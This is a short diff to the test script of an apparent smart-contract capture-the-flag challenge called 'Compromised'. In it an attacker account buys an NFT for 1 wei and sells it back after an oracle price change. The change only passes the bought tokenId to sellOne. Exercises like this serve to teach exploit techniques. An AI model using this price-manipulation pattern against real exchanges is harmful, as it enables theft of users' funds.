@@ -87,7 +87,8 @@ describe('Compromised challenge', function () {
         console.log(afterPrice.toString())
 		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: 1 });
         const tx = await boughtNft.wait()
-        console.log("Bought one",( tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString() ))
+        const tokenId = tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString()
+        console.log("Bought tokenId",tokenId)
 		const exchangeBalance = await ethers.provider.getBalance(this.exchange.address)
 
         console.log("Balance",exchangeBalance.toString())
@@ -97,7 +98,7 @@ describe('Compromised challenge', function () {
         }
         const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
 		console.log("dump price",dumpPrice.toString())
-		await this.exchange.connect(attacker).sellOne(1);
+		await this.exchange.connect(attacker).sellOne(tokenId);
         console.log("export")
  
     });
